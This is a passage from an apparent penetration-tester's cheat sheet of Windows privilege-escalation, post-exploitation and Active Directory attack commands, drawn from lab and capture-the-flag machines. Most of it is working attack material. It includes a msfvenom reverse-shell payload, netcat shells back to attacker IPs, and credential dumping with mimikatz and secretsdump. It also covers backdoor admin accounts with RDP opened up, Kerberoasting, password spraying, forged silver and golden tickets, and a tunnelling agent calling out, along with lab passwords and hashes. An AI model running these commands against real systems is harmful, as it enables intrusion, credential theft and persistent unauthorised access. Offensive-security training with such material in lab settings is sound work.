reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

Alternativelly you can also use AutoRuns (Sysinternals)

[https://learn.microsoft.com/pt-pt/sysinternals/downloads/autoruns](https://learn.microsoft.com/pt-pt/sysinternals/downloads/autoruns)

Using icacls or AccessChk we can confirm that anyone has write access to the program.exe file.

```
icacls [directory/file]
Accesschk.exe -accepteula -wuqv [file] 

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.56.235 lport=4444 -f exe -o program.exe
```

### Read SAM SYSTEM SECURITY

```
dir C:\Windows\System32\config\SAM
dir C:\Windows\System32\config\SYSTEM
dir C:\Windows\System32\config\SECURITY

icacls C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SYSTEM
icacls C:\Windows\System32\config\SECURITY
```

Volume Shadow Copy:

```
vshadow.exe -nw -p C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

reg.exe save hklm\system c:\system.bak
```

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Auto-Logon Credentials

```
Get-RegistryAutoLogon               -   PowerUp checks for Autologon credentials in the registry
```

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersio\Winlogon"

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultAutoAdminLogon
```

### Unattended Windows Installations

Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

```
type C:\Unattend.xml
dir C:\Windows\Panther\
type C:\Windows\Panther\Unattend.xml
dir C:\Windows\Panther\Unattend\
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\sysprep.inf
dir C:\Windows\System32\Sysprep\
type C:\Windows\System32\Sysprep\Sysprep.xml
type C:\Windows\System32\Sysprep\Sysprep.inf

Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,sysprep.inf -Recurse -ErrorAction SilentlyContinue
```

### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below:

**RDP**

If you have an RDP session:

```
runas /savecred /user:admin cmd.exe
runas /savecred /user:admin powershell.exe
```

**Regular Shell**

Proof of Concept (POC):

```
runas /env /noprofile /savecred /user:administrator "cmd.exe /c whoami > whoami.txt"
```

To get a shell, transfer `nc.exe` and run:

```
runas /env /noprofile /savecred /user:ACCESS\Administrator "nc.exe <ip> <port> -e cmd.exe"
```

### IIS Configuration Files

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called **web.config** and can store passwords for databases or configured authentication mechanisms.

Locations to check:

- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

Here is a quick way to find database connection strings in the file:

```
type C:\inetpub\wwwroot\web.config

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Startup Application

Check if we have write access to the directory of startup applications:

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Upload malicious reverse shell or add user to admin group and wait for an administrative user to login.

### GPP-Password

If the machine belongs to a domain and your user has access to `System Volume Information` there might be some sensitive files there.

First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables
```
Get-CachedGPPPassword               -   PowerUp checks for passwords in cached Group Policy Preferences files
```

```

# Output environment-variables
set

# Look for the following:
LOGONSERVER=\\NAMEOFSERVER
USERDNSDOMAIN=WHATEVER.LOCAL

# Look up ip-addres
nslookup nameofserver.whatever.local

# It will output something like this
Address:  192.168.1.101

# Now we mount it
net use z: \\192.168.1.101\SYSVOL

# And enter it
z:

# Now we search for the groups.xml file
dir Groups.xml /s
```

If we find the file with a password in it, we can decrypt it like this in Kali

```
gpp-decrypt encryptedpassword
```

```
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
```

### Installed Applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname   (check software with version 32 bit and below 64)

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### Vulnerable Drivers

Some driver might be vulnerable. I don't know how to check this in an efficient way.

```
# List all drivers
driverquery
```

Search drivers online.

# Post-Exploitation

## RDP Enable
Try 1:
```
net user /add backdoor NewPassword! && net localgroup administrators backdoor /add & net localgroup "Remote Desktop Users" backdoor /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v backdoor /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto
```

Try 2:
```
:: Create user and grant RDP rights
net user backdoor NewPassword! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

:: Enable RDP (correct key) and firewall
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: Ensure the service is running
sc config TermService start= auto
sc start TermService

# Enable PTH
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

## Mimikatz

```
.\mimikatz.exe 

#Enable SeDebugPrivilege and elevate privileges to SYSTEM privilege::debug 
token::elevate 

#Extract plaintext passwords and password hashes from all available sources 
sekurlsa::logonpasswords 

#Extract the NTLM hashes from the SAM 
lsadump::sam

lsadump::secrets
sekurlsa::logonpasswords
sekurlsa::tickets

#One Liner
.\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::sam /patch" "lsadump::sam" "sekurlsa::msv" "lsadump::secrets" "lsadump::lsa" "lsadump::lsa /patch" "lsadump::cache" "sekurlsa::logonpasswords full" "sekurlsa::ekeys" "sekurlsa::dpapi" "sekurlsa::credman" "vault::list" "vault::cred /patch" "exit"
```

## Domain Admin NTDS.dit
```
nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds
```

## Dump LSASS SAM LSA

```
nxc smb <ip_range> -u <user> -p <password> -M lsassy
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "exit"

nxc smb <ip_range> -u <user> -p <password> --sam
mimikatz "privilege::debug" "lsadump::sam" "exit"

nxc smb <ip_range> -u <user> -p <password> --lsa
mimikatz "privilege::debug" "lsadump::lsa" "exit"
reg save HKLM\SECURITY <file>;  reg save HKLM\SYSTEM <file>
impacket-secretsdump -system SYSTEM -security SECURITY
```


## Read Powershell History 

```
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Ligolo-NG

```
sudo ligolo-proxy -selfcert
./ligolo_agent64 -ignore-cert -connect 10.10.16.2:11601 &

session
1
ifconfig
ifcreate --name ligolo0
tunnel_start --tun ligolo0
tunnel_list
add_route --name ligolo0 --route 172.16.1.0/24
route_list
```

If target cannot access Kali (HTTP different ports or Ping Kali) ->  Add a listener that redirects traffic when it hits the middle target (agent):
```
listener_add --addr 0.0.0.0:4444 --to <KaliIP>:4444
```

To catch reverse shells we use the agent's IP and Port:

```
.\nc64.exe 10.10.127.147 4444 -e cmd
```

# AD
https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
## Find DC IP

```
nmcli dev show <interface>
nslookup -type=SRV _ldap._tcp.dc_msdcs.<domain>
nmap -p 88 --open <ip_range>
```

## Dump Domain DNS Records

```
dig axfr <domain_name> @<name_server>
```

## ZeroLogon 

```
netexec Module
```

## No Credentials

### AD Blind Username Enumeration (Kerbrute) ASREP

```
kerbrute userenum --dc 172.16.2.5 -d dante.admin usernames.txt
nxc smb 172.16.2.5 -u jbercov -p passwords.txt
nxc ldap 172.16.2.5 -u jbercov -p '' --asreproast asrep.hash
hashcat asrep.hash /usr/share/wordlists/rockyou.txt /usr/share/hashcat/rules/best64.rule
```

### AD Username Enumeration BruteForce (RID)

```
nxc smb cicada.htb -u '.' -p '' --smb-timeout 10 --rid-brute | grep "SidTypeUser" |cut -d "\\" -f2| cut -d " " -f1 > users.txt

impacket-lookupsid cicada.htb/'.'@cicada.htb -no-pass | grep "SidTypeUser" |cut -d "\\" -f2| cut -d " " -f1 > users.txt
impacket-lookupsid cicada.htb/'guest'@cicada.htb -no-pass | grep "SidTypeUser" |cut -d "\\" -f2| cut -d " " -f1 > users.txt

enum4linux -r -u 'guest' -p '' cicada.htb # Slow and not the best output
```

### Create List of Usernames
https://github.com/urbanadventurer/username-anarchy
```
./username-anarchy --input-file ./test-names.txt
./username-anarchy anna key
```

### Username Enumeration
If you can reach the DC:
```
kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
```

## Credentials

### ADPEAS

```
. .\adPEAS.ps1
```

```
Invoke-adPEAS -Domain 'contoso.com' -Server 'dc1.contoso.com' -Username 'contoso\johndoe' -Password 'Passw0rd1!' -Force
```

### Password Policy

```
netexec smb dc_ip -u 'test' -p 'test' --pass-pol
```

Fined (elevated):

```
Get-ADFineGrainedPasswordPolicy -filter *
```

### AD NetExec Enumeration Remote

```
netexec ldap administrator.htb -d administrator.htb -u Olivia -p 'ichliebedich' -M whoami

netexec ldap administrator.htb -d administrator.htb -u Olivia -p 'ichliebedich' -M groupmembership -o USER=olivia
```

Modules
```
netexec ldap administrator.htb -d administrator.htb -u Olivia -p 'ichliebedich' --find-delegation

netexec ldap administrator.htb -d administrator.htb -u Olivia -p 'ichliebedich' --trusted-for-delegation

netexec ldap administrator.htb -d administrator.htb -u Olivia -p 'ichliebedich' --asreproast asreproast.hashes

netexec ldap administrator.htb -d administrator.htb -u Olivia -p 'ichliebedich' --kerberoasting kerberoasting.hashes

netexec ldap cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -M get-desc-users
```

### Bloodhound Remote

```
netexec ldap administrator.htb -d administrator.htb -u Olivia -p 'ichliebedich' --dns-server 10.129.44.101 --bloodhound -c All

bloodhound-ce-python -c All -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.222.122
```

### AD CS

```
netexec -M adcs
certipy find -u <user>@<domain> -p 'password' -dc-ip <dcip>
```

### GPO
Alternatively there is also the PowerGPOAbuse (Powershell) version of this script:
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
gpupdate /force
# check if added to admin
net localgroup administrators
```

### DC Sync

```
impacket-secretsdump hutch.offsec/Administrator@hutch.offsec
```

### Read LAPS Password

```
bloodyAD --host 192.168.153.122 -d hutch.offsec -u fmcsorley -p 'CrabSharkJellyfish192' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

netexec ldap hutch.offsec -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -M laps
```

### Change AD User Password Remote (GenericAll/ForceChangePassword)

```
bloodyAD -d administrator.htb -u Olivia -p ichliebedich --dc-ip 10.129.44.101 set password michael "Password123"

net rpc password "SHAWNA_BRAY" "marlboro(1985)" -U "THM"/"TABATHA_BRITT" -S "10.10.61.233" #-S is DC
```

### Target Kerberoast Remote

```
python targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'Password' --dc-ip 10.129.44.101 --request-user ethan

impacket-GetUserSPNs -request -dc-ip <dc-ip> domain/user:password

Rubeus.exe kerberoast

hashcat -m 13100 kerberoastable.hash /usr/share/wordlists/rockyou.txt --force
```

### Extract User List and Spray

Extract Domain Users List:
```
Get-DomainUser | Select-Object -ExpandProperty samaccountname > users.txt # Powersploit

impacket-lookupsid administrator.htb/olivia@10.129.44.101 | grep "SidTypeUser" |cut -d "\\" -f2| cut -d " " -f1 > users.txt

netexec ldap 10.129.44.101 -u michael -p Password123 --users | awk '{print $5}' | sed '1,4d' > users.txt # Check for garbage first

```

Spray:
```
netexec smb administrator.htb -d administrator.htb -u users.txt  -p UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
```

### Resource Based Contraint Delegation
Linux: (Add DC and Domain to /etc/hosts for this to work)
```
impacket-getST -spn 'cifs/HayStack.thm.corp' -impersonate 'Administrator' 'thm.corp/DARLA_WINTERS'

export KRB5CCNAME=Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache

impacket-wmiexec THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
```

### SeBackupPrivilege/SeRestorePrivilege

**Option 1**: Dump SAM and SYSTEM and retrieve the local Administrator Hash (Might be outdated on the DC since it relies on the NTDS.DIT file)

```
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM

impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
```

**Option 2**: Dump SAM, SYSTEM and SECURITY (Might timeout during smb so its better to dump on the target machine and then exflitrate with separate commands)

```
impacket-smbserver -smb2support share /home/nabecos/Desktop
impacket-reg emily.oscars@cicada.htb backup -o \\\\10.10.16.32\\share
#or 
.\BackupOperatorToDA.exe -t \\CICADA-DC -o \\10.10.16.32\share\
.\BackupOperatorToDA.exe -t \\CICADA-DC -o C:\Users\svc-printer\Documents\

impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
```

**Option 3**: Dump NTDS.DIT File

Create a file called `diskshadow.txt`
```
set verbose on  
set metadata C:\Windows\Temp\meta.cab  
set context clientaccessible  
set context persistent  
begin backup  
add volume C: alias cdrive  
create  
expose %cdrive% E:  
end backup
```

Edit the file so its properly parsed by diskshadow and upload it:

```
unix2dos diskshadow.txt
```

Launch diskshadow:

```
diskshadow /s diskshadow.txt
robocopy /b E:\Windows\ntds . ntds.dit
```

Extract hashes:

```
impacket-secretsdump -security SECURITY.save -ntds ntds.dit LOCAL
```

### Silver Ticket

```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
```

Create Environmental Variable:
```
export KRB5CCNAME=$PWD/Administrator.ccache
```

Configure /etc/krb5user.conf and add the KDC and domain name to the DC IP in /etc/hosts ( if you are acessing a speciifc port using a port forward you can do the same to 127.0.0.1):

```
[libdefaults]  
        default_realm = NAGOYA-INDUSTRIES.COM  
        kdc_timesync = 1  
        ccache_type = 4  
        forwardable = true  
        proxiable = true  
    rdns = false  
    dns_canonicalize_hostname = false  
        fcc-mit-ticketflags = true  
  
[realms]          
        NAGOYA-INDUSTRIES.COM = {  
                kdc = nagoya.nagoya-industries.com  
        }  
  
[domain_realm]  
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

We can create the forged service ticket with the _kerberos::golden_ module.

- Domain SID (**/sid:**)
- Domain name (**/domain:**),
- Target where the SPN runs (**/target:**).
- We also need to include the SPN protocol (**/service:**)
- NTLM hash of the SPN (**/rc4:**)
- **/ptt** option, which allows us to inject the forged ticket into the memory of the machine we execute the command on
- We must enter an existing domain user for **/user:**. This user will be set in the forged ticket. However, we could also use any other domain user since we can set the permissions and groups ourselves.

```powershell
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```


### Golden Ticket

```
ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>

mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"
```

### Create User & Add to Group

```
net user backdor Password!123 /add
net localgroup "Administrators" backdoor /add
```

```
net user Mishky Password00 /add /domain
net group "Domain Admins" Mishky /add /domain
```

### UAC Bypass
https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
https://lolbas-project.github.io/lolbas/Binaries/Wsreset/
https://g3tsyst3m.github.io/privilege%20escalation/Creative-UAC-Bypass-Methods-for-the-Modern-Era/

## Delegation

```
impacket-findDelegation domain/user:password
```

### Unconstrained Delegation
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation
Force Connection with Coerce -> Extract tickets (Inject to PTT):
```
.\SpoolSample.exe dc01 ws01

mimikatz privilege::debug sekurlsa::tickets /export

kerberos::ptt <ticket.kirbi>
lsadump::dcsync /domain:<fqdn> /user:<target_user>

Rubeus.exe ptt /ticket:<base64.kirbi>
```

If you want to perform this from linux (convert kirbi to ccache):
```
impacket-ticket_converter ticket.ccache ticket.kirbi
impacket-ticket_converter ticket.kirbi ticket.ccache

export KRB5CCNAME=</path/to/converted.ccache>
```

### Constrained Delegation

```
impacket-getST -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10

export KRB5CCNAME=administrator.ccache
```

### RBCD
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution



## Lateral Movements

### PsExec

```
impacket-psexec backdoor@172.16.1.13
```

### WinRM

```
evil-winrm -i 172.16.1.5 -u sophie -p 'Alltheleavesarebrown1'

Enter-PSSession -ComputerName <computer> -Credential <domain>\<user>

nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>
```

### RDP

```
xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>

impacket-reg <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
```

### SMB

```
impacket-smbclient  <domain>/<user>:<password>@<ip>
```

### MSSQL

```
impacket-mssqlclient -windows-auth <domain>/<user>:<password>@<ip>
```

### Pseudo Shell

```
impacket-atexec <domain>/<user>:<password>@<ip> "command"
impacket-smbexec <domain>/<user>:<password>@<ip>
impacket-wmiexec <domain>/<user>:<password>@<ip>
impacket-dcomexec <domain>/<user>:<password>@<ip>

nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>
```

# Errors
## Kerberos Errors
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
sudo su
timedatectl set-ntp off
rdate -n <ip>

timedatectl set-ntp on # Cleanup
```


## Powershell Language Model

```
$ExecutionContext.SessionState.LanguageMode # checks language mode
```

— **FullLanguage**: all commands can be executed  
— **ConstrainedLanguage**: restricts commands invoking Windows API  
— **RestrictedLanguage**: only limited commands can be executed  
— **NoLanguage**: no commands can be executed


# Hashes

- crackstation
- ntlm.pw -> NTLM hashes

## Convert Password to NTLM
In cases we cannot pass the password but the hash (Silver and golden ticket attacks):
```
echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
```
